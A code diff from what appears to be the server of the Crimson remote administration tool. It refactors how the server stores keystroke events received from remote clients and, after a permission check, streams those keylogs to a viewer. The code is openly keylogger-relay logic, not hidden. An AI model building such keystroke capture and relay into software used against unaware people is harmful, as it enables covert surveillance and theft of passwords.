@@ -26,6 +26,7 @@ import com.subterranean_security.crimson.core.net.auth.KeyAuthGroup;
 import com.subterranean_security.crimson.core.net.executor.temp.ExeI;
 import com.subterranean_security.crimson.core.net.executor.temp.Exelet;
 import com.subterranean_security.crimson.core.store.NetworkStore;
+import com.subterranean_security.crimson.core.store.ProfileStore;
 import com.subterranean_security.crimson.core.util.CryptoUtil;
 import com.subterranean_security.crimson.core.util.ProtoUtil.PDFactory;
 import com.subterranean_security.crimson.proto.core.Misc.Outcome;
@@ -42,7 +43,6 @@ import com.subterranean_security.crimson.proto.core.net.sequences.State.RS_Chang
 import com.subterranean_security.crimson.sc.Logsystem;
 import com.subterranean_security.crimson.server.store.AuthStore;
 import com.subterranean_security.crimson.server.store.ListenerStore;
-import com.subterranean_security.crimson.server.store.ServerProfileStore;
 import com.subterranean_security.crimson.sv.permissions.Perm;
 import com.subterranean_security.crimson.sv.profile.ClientProfile;
 import com.subterranean_security.crimson.universal.Universal;
@@ -55,7 +55,7 @@ public class MiscExe extends Exelet implements ExeI {
 
 	public void ev_kevent(Message m) {
 		try {
-			ServerProfileStore.getClient(connector.getCvid()).getKeylog().addEvent(m.getEvKevent());
+			ProfileStore.getClient(connector.getCvid()).getKeylog().addEvent(m.getEvKevent());
 		} catch (Exception e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
@@ -68,17 +68,17 @@ public class MiscExe extends Exelet implements ExeI {
 		Date target = new Date(rq.getStartDate());
 
 		// check permissions
-		if (!ServerProfileStore.getViewer(connector.getCvid()).getPermissions().getFlag(rq.getCid(),
+		if (!ProfileStore.getViewer(connector.getCvid()).getPermissions().getFlag(rq.getCid(),
 				Perm.client.keylogger.read_logs)) {
 			connector.write(Message.newBuilder().setId(m.getId())
 					.setRsKeyUpdate(RS_KeyUpdate.newBuilder().setResult(false)).build());
 			return;
 		}
 
-		ClientProfile cp = ServerProfileStore.getClient(rq.getCid());
+		ClientProfile cp = ProfileStore.getClient(rq.getCid());
 		if (cp != null) {
 			for (EV_KEvent k : cp.getKeylog().getEventsAfter(target)) {
-				connector.write(Message.newBuilder().setSid(rq.getCid()).setEvKevent(k).build());
+				connector.write(Message.newBuilder().setFrom(rq.getCid()).setEvKevent(k).build());
 			}
 			connector.write(Message.newBuilder().setId(m.getId())
 					.setRsKeyUpdate(RS_KeyUpdate.newBuilder().setResult(true)).build());
@@ -89,7 +89,7 @@ public class MiscExe extends Exelet implements ExeI {
 
 	}
 
-	public void rq_group_challenge(Message m) {
+	public void rq_key_challenge(Message m) {
 		if (connector.getState() != ConnectionState.AUTH_STAGE2) {
 			return;
 		}
